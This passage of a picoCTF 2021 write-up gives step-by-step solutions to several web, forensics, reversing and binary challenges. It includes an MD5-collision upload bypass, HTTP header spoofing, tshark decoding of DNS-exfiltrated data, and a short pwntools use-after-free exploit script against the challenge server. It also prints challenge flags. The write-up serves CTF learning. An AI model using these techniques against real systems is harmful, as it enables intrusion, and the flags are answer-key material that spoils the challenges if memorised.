                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}

// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>It is my Birthday</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <h3 class="text-muted">It is my Birthday</h3>
        </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <h3>See if you are invited to my party!</h3>
                </div>
            </div>
            <br/>
            <div class="upload-form">
                <form role="form" action="/index.php" method="post" enctype="multipart/form-data">
                <div class="row">
                    <div class="form-group">
                        <input type="file" name="file1" id="file1" class="form-control input-lg">
                        <input type="file" name="file2" id="file2" class="form-control input-lg">
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <input type="submit" class="btn btn-lg btn-success btn-block" name="submit" value="Upload">
                    </div>
                </div>
                </form>
            </div>
        </div>
    </div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
```
5. Find the flag in it ~

### Useful Stuffs
1. https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/It%20is%20my%20Birthday/It%20is%20my%20Birthday.md
2. https://www.mscs.dal.ca/~selinger/md5collision/

## Wireshark twoo twooo two twoo...
![](https://i.imgur.com/VfHRRrM.png)

### Hints
1. Did you really find _the_ flag?
2. Look for traffic that seems suspicious.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/23653a37cdf4727dfbf0493d80143b3f/shark2.pcapng`
2. `tshark -qz io,phs -r shark2.pcapng`
![](https://i.imgur.com/TEe3Ggz.png)
3. ` tshark -r shark2.pcapng -qz follow,tcp,ascii,5`
![](https://i.imgur.com/piefZrp.png)
4. `curl http://www.reddshrimpandherring.com`
```htmlmixed=
<html>
        <head>
                <script>
                        var forwardingUrl = "/page/bouncy.php?&bpae=GbhWt6cGokx7N5vvBclEkIg0rumCg9lu6R5gCamhTDDC5E3AfwfNwrHYhrTVXbGY9gpVYAFZN3HI60KzLbx3PyL%2B7B%2B%2BNHvAl92d%2F7LD1Sjyq%2BFYHVZzIbSb7vK7PrGCAG2FdMh41DZAegJZLluV05R6Jb15sZbhqnAwbKYeIkfMb6jhWY6U1qHdksZyIg0ei9Z7KP5HX0Lold%2Bt%2F9ePNusge2EFeCIlvfNA0mYsUuP5IRN1KFFfJYs%2FOnNojN77D83aZwlhR9gBtzOpgzB4A4sqkgBB8eTs7K4GWLMQqMCCho%2BF8DP0enH3vyjmO8hMKiKc8JvI6byIsIml1sRLcqbnzT7ELp8gxVfq1Yf4fN3VtBhTjO3nmpVZoviwepv0hLoLpJCdBs1T1Yxn6mqKNqJq0NQ%3D&redirectType=js";
                        var destinationUrl = "/page/bouncy.php?&bpae=GbhWt6cGokx7N5vvBclEkIg0rumCg9lu6R5gCamhTDDC5E3AfwfNwrHYhrTVXbGY9gpVYAFZN3HI60KzLbx3PyL%2B7B%2B%2BNHvAl92d%2F7LD1Sjyq%2BFYHVZzIbSb7vK7PrGCAG2FdMh41DZAegJZLluV05R6Jb15sZbhqnAwbKYeIkfMb6jhWY6U1qHdksZyIg0ei9Z7KP5HX0Lold%2Bt%2F9ePNusge2EFeCIlvfNA0mYsUuP5IRN1KFFfJYs%2FOnNojN77D83aZwlhR9gBtzOpgzB4A4sqkgBB8eTs7K4GWLMQqMCCho%2BF8DP0enH3vyjmO8hMKiKc8JvI6byIsIml1sRLcqbnzT7ELp8gxVfq1Yf4fN3VtBhTjO3nmpVZoviwepv0hLoLpJCdBs1T1Yxn6mqKNqJq0NQ%3D&redirectType=meta";
                        var addDetection = true;
                        if (addDetection) {
                                var inIframe = window.self !== window.top;
                                forwardingUrl += "&inIframe=" + inIframe;
                                var inPopUp = (window.opener !== undefined && window.opener !== null && window.opener !== window);
                                forwardingUrl += "&inPopUp=" + inPopUp;
                        }
                        window.location.replace(forwardingUrl);
                </script>
                <noscript>
                        <meta http-equiv="refresh" content="1;url=/page/bouncy.php?&bpae=GbhWt6cGokx7N5vvBclEkIg0rumCg9lu6R5gCamhTDDC5E3AfwfNwrHYhrTVXbGY9gpVYAFZN3HI60KzLbx3PyL%2B7B%2B%2BNHvAl92d%2F7LD1Sjyq%2BFYHVZzIbSb7vK7PrGCAG2FdMh41DZAegJZLluV05R6Jb15sZbhqnAwbKYeIkfMb6jhWY6U1qHdksZyIg0ei9Z7KP5HX0Lold%2Bt%2F9ePNusge2EFeCIlvfNA0mYsUuP5IRN1KFFfJYs%2FOnNojN77D83aZwlhR9gBtzOpgzB4A4sqkgBB8eTs7K4GWLMQqMCCho%2BF8DP0enH3vyjmO8hMKiKc8JvI6byIsIml1sRLcqbnzT7ELp8gxVfq1Yf4fN3VtBhTjO3nmpVZoviwepv0hLoLpJCdBs1T1Yxn6mqKNqJq0NQ%3D&redirectType=meta" />
                </noscript>
        </head>
```
5. Because there's no flag above, run `tshark -nr shark2.pcapng -Y 'dns'`
6. `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8'`
7. `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8' |grep -v response `
8. `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8' |grep -v response |grep local`
9. `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8' |grep -v response |grep local |awk -e '{print $12}'`
10. `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8' |grep -v response |grep local |awk -e '{print $12}' |sed -e 's/\..*//' `
11. And now is to convert things above through base64 decoder `tshark -nr shark2.pcapng -Y 'dns' | grep -v '8.8.8.8' |grep -v response |grep local |awk -e '{print $12}' |sed -e 's/\..*//' |base64 -d`
12. Now the flag pops out ~


### Useful Stuffs
1. https://www.youtube.com/watch?v=mQB_yoAY0gg&ab_channel=MartinCarlisle
2. http://linux.51yip.com/search/tshark
3. https://blog.gtwang.org/linux/linux-grep-command-tutorial-examples/
4. https://www.geeksforgeeks.org/awk-command-unixlinux-examples/
5. https://www.hy-star.com.tw/tech/linux/sed/sed.html


## Who are you?
![](https://i.imgur.com/eveFdKp.png)

### Hints
1. It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

### Solution by steps
1. Press the link and you'll probably see this
![](https://i.imgur.com/tqM0XqE.png)
2. [Install and setup Postman](https://www.youtube.com/watch?v=MCPdfuzmyxY&ab_channel=Mukeshotwani) through this [link](https://www.postman.com/downloads/)
3. Click the plus sign
![](https://i.imgur.com/zdPdjqd.png)
4. Paste your request URL to the blank beside GET and click the blue SEND button 
![](https://i.imgur.com/Vp9zTQy.png)
5. Click the Header button in the upper window and the Preview button in the bottom window and see `Only people who use the official PicoBrowser are allowed on this site!`
![](https://i.imgur.com/xK1iYJl.png)
6. Create a `User-Agent` blank, paste `PicoBrowser` as the value and you'll see `I don't trust users visiting from another site.` this time.
![](https://i.imgur.com/iEjJuQV.png)
7. Create a `Referer` and paste `YOUR_REQUEST_URL` again in the second block to see this
![](https://i.imgur.com/MSOSGeZ.png)
8. Add a `Date` with the value `2018` in the headers and you'll see this
![](https://i.imgur.com/AcpZNwB.png)
9. Add `DNT` to the headers with the value `1`
![](https://i.imgur.com/lqbgJ5x.png)
10. Create the `X-Forwarded-For` header and assign a Swedish IP addresses (Google "Swedish IP addresses" and get one you liked)
![](https://i.imgur.com/1VmMqYm.png)
11. Add `Accept-Language` in the headers with the characters `sv` and here comes the flag
![](https://i.imgur.com/SUBba8j.png)

### Useful Stuffs
1. https://github.com/ZeroDayTea/PicoCTF-2021-Killer-Queen-Writeups/blob/main/WebExploitation/WhoAreYou.md
2. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

## Hurry up! Wait!
![](https://i.imgur.com/xDTxbUg.png)

### Hints 
None

### Solution by steps
1. [Install Ghidra](https://www.youtube.com/watch?v=CGD9xH62Ze8&ab_channel=stryker2k2)
2. Download the exe file it gave
3. Inport the file to a new directory you just create by Ghidra
4. Open it and you will see whole bunch of assembly code
*And you might see these somewhere in the 'Listing'*
```python!
                             DAT_00102cc0                                    XREF[3]:     FUN_00102136:0010213f (*) , 
                                                                                          FUN_00102136:0010214d (*) , 
                                                                                          FUN_00102136:00102156 (*)   
        00102cc0 31              ??         31h    1
                             DAT_00102cc1                                    XREF[3]:     FUN_0010216a:00102173 (*) , 
                                                                                          FUN_0010216a:00102181 (*) , 
                                                                                          FUN_0010216a:0010218a (*)   
        00102cc1 32              ??         32h    2
                             DAT_00102cc2                                    XREF[3]:     FUN_0010219e:001021a7 (*) , 
                                                                                          FUN_0010219e:001021b5 (*) , 
                                                                                          FUN_0010219e:001021be (*)   
        00102cc2 33              ??         33h    3
                             DAT_00102cc3                                    XREF[3]:     FUN_001021d2:001021db (*) , 
                                                                                          FUN_001021d2:001021e9 (*) , 
                                                                                          FUN_001021d2:001021f2 (*)   
        00102cc3 34              ??         34h    4
                             DAT_00102cc4                                    XREF[3]:     FUN_00102206:0010220f (*) , 
                                                                                          FUN_00102206:0010221d (*) , 
                                                                                          FUN_00102206:00102226 (*)   
        00102cc4 35              ??         35h    5
                             DAT_00102cc5                                    XREF[3]:     FUN_0010223a:00102243 (*) , 
                                                                                          FUN_0010223a:00102251 (*) , 
                                                                                          FUN_0010223a:0010225a (*)   
        00102cc5 36              ??         36h    6
                             DAT_00102cc6                                    XREF[3]:     FUN_0010226e:00102277 (*) , 
                                                                                          FUN_0010226e:00102285 (*) , 
                                                                                          FUN_0010226e:0010228e (*)   
        00102cc6 37              ??         37h    7
                             DAT_00102cc7                                    XREF[3]:     FUN_001022a2:001022ab (*) , 
                                                                                          FUN_001022a2:001022b9 (*) , 
                                                                                          FUN_001022a2:001022c2 (*)   
        00102cc7 38              ??         38h    8
                             DAT_00102cc8                                    XREF[3]:     FUN_001022d6:001022df (*) , 
                                                                                          FUN_001022d6:001022ed (*) , 
                                                                                          FUN_001022d6:001022f6 (*)   
        00102cc8 39              ??         39h    9
                             DAT_00102cc9                                    XREF[3]:     FUN_0010230a:00102313 (*) , 
                                                                                          FUN_0010230a:00102321 (*) , 
                                                                                          FUN_0010230a:0010232a (*)   
        00102cc9 61              ??         61h    a
                             DAT_00102cca                                    XREF[3]:     FUN_0010233e:00102347 (*) , 
                                                                                          FUN_0010233e:00102355 (*) , 
                                                                                          FUN_0010233e:0010235e (*)   
        00102cca 62              ??         62h    b
                             DAT_00102ccb                                    XREF[3]:     FUN_00102372:0010237b (*) , 
                                                                                          FUN_00102372:00102389 (*) , 
                                                                                          FUN_00102372:00102392 (*)   
        00102ccb 63              ??         63h    c
                             DAT_00102ccc                                    XREF[3]:     FUN_001023a6:001023af (*) , 
                                                                                          FUN_001023a6:001023bd (*) , 
                                                                                          FUN_001023a6:001023c6 (*)   
        00102ccc 64              ??         64h    d
                             DAT_00102ccd                                    XREF[3]:     FUN_001023da:001023e3 (*) , 
                                                                                          FUN_001023da:001023f1 (*) , 
                                                                                          FUN_001023da:001023fa (*)   
        00102ccd 65              ??         65h    e
                             DAT_00102cce                                    XREF[3]:     FUN_0010240e:00102417 (*) , 
                                                                                          FUN_0010240e:00102425 (*) , 
                                                                                          FUN_0010240e:0010242e (*)   
        00102cce 66              ??         66h    f
                             DAT_00102ccf                                    XREF[3]:     FUN_00102442:0010244b (*) , 
                                                                                          FUN_00102442:00102459 (*) , 
                                                                                          FUN_00102442:00102462 (*)   
        00102ccf 67              ??         67h    g
                             DAT_00102cd0                                    XREF[3]:     FUN_00102476:0010247f (*) , 
                                                                                          FUN_00102476:0010248d (*) , 
                                                                                          FUN_00102476:00102496 (*)   
        00102cd0 68              ??         68h    h
                             DAT_00102cd1                                    XREF[3]:     FUN_001024aa:001024b3 (*) , 
                                                                                          FUN_001024aa:001024c1 (*) , 
                                                                                          FUN_001024aa:001024ca (*)   
        00102cd1 69              ??         69h    i
                             DAT_00102cd2                                    XREF[3]:     FUN_001024de:001024e7 (*) , 
                                                                                          FUN_001024de:001024f5 (*) , 
                                                                                          FUN_001024de:001024fe (*)   
        00102cd2 6a              ??         6Ah    j
                             DAT_00102cd3                                    XREF[3]:     FUN_00102512:0010251b (*) , 
                                                                                          FUN_00102512:00102529 (*) , 
                                                                                          FUN_00102512:00102532 (*)   
        00102cd3 6b              ??         6Bh    k
                             DAT_00102cd4                                    XREF[3]:     FUN_00102546:0010254f (*) , 
                                                                                          FUN_00102546:0010255d (*) , 
                                                                                          FUN_00102546:00102566 (*)   
        00102cd4 6c              ??         6Ch    l
                             DAT_00102cd5                                    XREF[3]:     FUN_0010257a:00102583 (*) , 
                                                                                          FUN_0010257a:00102591 (*) , 
                                                                                          FUN_0010257a:0010259a (*)   
        00102cd5 6d              ??         6Dh    m
                             DAT_00102cd6                                    XREF[3]:     FUN_001025ae:001025b7 (*) , 
                                                                                          FUN_001025ae:001025c5 (*) , 
                                                                                          FUN_001025ae:001025ce (*)   
        00102cd6 6e              ??         6Eh    n
                             DAT_00102cd7                                    XREF[3]:     FUN_001025e2:001025eb (*) , 
                                                                                          FUN_001025e2:001025f9 (*) , 
                                                                                          FUN_001025e2:00102602 (*)   
        00102cd7 6f              ??         6Fh    o
                             DAT_00102cd8                                    XREF[3]:     FUN_00102616:0010261f (*) , 
                                                                                          FUN_00102616:0010262d (*) , 
                                                                                          FUN_00102616:00102636 (*)   
        00102cd8 70              ??         70h    p
                             DAT_00102cd9                                    XREF[3]:     FUN_0010264a:00102653 (*) , 
                                                                                          FUN_0010264a:00102661 (*) , 
                                                                                          FUN_0010264a:0010266a (*)   
        00102cd9 71              ??         71h    q
                             DAT_00102cda                                    XREF[3]:     FUN_0010267e:00102687 (*) , 
                                                                                          FUN_0010267e:00102695 (*) , 
                                                                                          FUN_0010267e:0010269e (*)   
        00102cda 72              ??         72h    r
                             DAT_00102cdb                                    XREF[3]:     FUN_001026b2:001026bb (*) , 
                                                                                          FUN_001026b2:001026c9 (*) , 
                                                                                          FUN_001026b2:001026d2 (*)   
        00102cdb 73              ??         73h    s
                             DAT_00102cdc                                    XREF[3]:     FUN_001026e6:001026ef (*) , 
                                                                                          FUN_001026e6:001026fd (*) , 
                                                                                          FUN_001026e6:00102706 (*)   
        00102cdc 74              ??         74h    t
                             DAT_00102cdd                                    XREF[3]:     FUN_0010271a:00102723 (*) , 
                                                                                          FUN_0010271a:00102731 (*) , 
                                                                                          FUN_0010271a:0010273a (*)   
        00102cdd 75              ??         75h    u
                             DAT_00102cde                                    XREF[3]:     FUN_0010274e:00102757 (*) , 
                                                                                          FUN_0010274e:00102765 (*) , 
                                                                                          FUN_0010274e:0010276e (*)   
        00102cde 76              ??         76h    v
                             DAT_00102cdf                                    XREF[3]:     FUN_00102782:0010278b (*) , 
                                                                                          FUN_00102782:00102799 (*) , 
                                                                                          FUN_00102782:001027a2 (*)   
        00102cdf 77              ??         77h    w
                             DAT_00102ce0                                    XREF[3]:     FUN_001027b6:001027bf (*) , 
                                                                                          FUN_001027b6:001027cd (*) , 
                                                                                          FUN_001027b6:001027d6 (*)   
        00102ce0 78              ??         78h    x
                             DAT_00102ce1                                    XREF[3]:     FUN_001027ea:001027f3 (*) , 
                                                                                          FUN_001027ea:00102801 (*) , 
                                                                                          FUN_001027ea:0010280a (*)   
        00102ce1 79              ??         79h    y
                             DAT_00102ce2                                    XREF[3]:     FUN_0010281e:00102827 (*) , 
                                                                                          FUN_0010281e:00102835 (*) , 
                                                                                          FUN_0010281e:0010283e (*)   
        00102ce2 7a              ??         7Ah    z
                             DAT_00102ce3                                    XREF[3]:     FUN_00102852:0010285b (*) , 
                                                                                          FUN_00102852:00102869 (*) , 
                                                                                          FUN_00102852:00102872 (*)   
        00102ce3 43              ??         43h    C
                             DAT_00102ce4                                    XREF[3]:     FUN_00102886:0010288f (*) , 
                                                                                          FUN_00102886:0010289d (*) , 
                                                                                          FUN_00102886:001028a6 (*)   
        00102ce4 54              ??         54h    T
                             DAT_00102ce5                                    XREF[3]:     FUN_001028ba:001028c3 (*) , 
                                                                                          FUN_001028ba:001028d1 (*) , 
                                                                                          FUN_001028ba:001028da (*)   
        00102ce5 46              ??         46h    F
                             DAT_00102ce6                                    XREF[3]:     FUN_001028ee:001028f7 (*) , 
                                                                                          FUN_001028ee:00102905 (*) , 
                                                                                          FUN_001028ee:0010290e (*)   
        00102ce6 5f              ??         5Fh    _
                             DAT_00102ce7                                    XREF[3]:     FUN_00102922:0010292b (*) , 
                                                                                          FUN_00102922:00102939 (*) , 
                                                                                          FUN_00102922:00102942 (*)   
        00102ce7 7b              ??         7Bh    {
                             DAT_00102ce8                                    XREF[3]:     FUN_00102956:0010295f (*) , 
                                                                                          FUN_00102956:0010296d (*) , 
                                                                                          FUN_00102956:00102976 (*)   
        00102ce8 7d              ??         7Dh    }

```
5. Click 'Functions' >>> 'FUN_0010' >>> 'FUN_00102' >>> 'FUN_001029' >>> 'FUN_0010298a' and you'll see this
![](https://i.imgur.com/spMzZv4.png)
```cpp=

void FUN_0010298a(void)

{
  ada__calendar__delays__delay_for(1000000000000000);
  FUN_00102616();
  FUN_001024aa();
  FUN_00102372();
  FUN_001025e2();
  FUN_00102852();
  FUN_00102886();
  FUN_001028ba();
  FUN_00102922();
  FUN_001023a6();
  FUN_00102136();
  FUN_00102206();
  FUN_0010230a();
  FUN_00102206();
  FUN_0010257a();
  FUN_001028ee();
  FUN_0010240e();
  FUN_001026e6();
  FUN_00102782();
  FUN_001028ee();
  FUN_001022a2();
  FUN_0010226e();
  FUN_001023da();
  FUN_00102206();
  FUN_0010230a();
  FUN_0010233e();
  FUN_00102136();
  FUN_00102956();
  return;
}
```

6. Drag out the 'Listing' window and place beside the 'Code Browser'. 
7. Press the FUN_00101XXX() in the 'Code Browser' and it will takes you to the function similliar with this
 ```cpp
void FUN_00102616(void)

{
  ada__text_io__put__4(&DAT_00102cd8,&DAT_00102cb8);
  return;
}
```
8. Press the first pass-in-text(in this case is '&DAT_00102cd8') and the 'Listing' window will show up the letter which represents the text.
![](https://i.imgur.com/mHyW7bX.png)

9. Continue doing so until you get your flag ~

## Unsubscriptions Are Free
![](https://i.imgur.com/amwYZsq.png)

### Hints
1. http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf

### Solution by steps
1. `wget https://mercury.picoctf.net/static/43f235836b4db8ccce6e52e4cbe1624d/vuln`
2. `wget https://mercury.picoctf.net/static/43f235836b4db8ccce6e52e4cbe1624d/vuln.c`
3. `strings vuln,c` and after knowing how it works
4. `vim solve.py` and write down
```python=
from pwn import *

context.arch = "x86"

# p = process("./pico_free")
p = remote('mercury.picoctf.net', YOUR_PORT_NAME)

p.sendline("s")
p.recvuntil(b"OOP! Memory leak...")
addr = int(p.recvline().decode().strip(), 16)
p.sendline("i")
p.sendline("y")
p.sendline("l")
p.sendlineafter(b"anyways:", p32(addr))
p.sendline("e")
print(p.recvall().decode())
```
5. `python solve.py` and get your  flag

### Useful Stuffs
1. https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/
2. https://www.youtube.com/watch?v=ffJRcNEyApI&ab_channel=MartinCarlisle

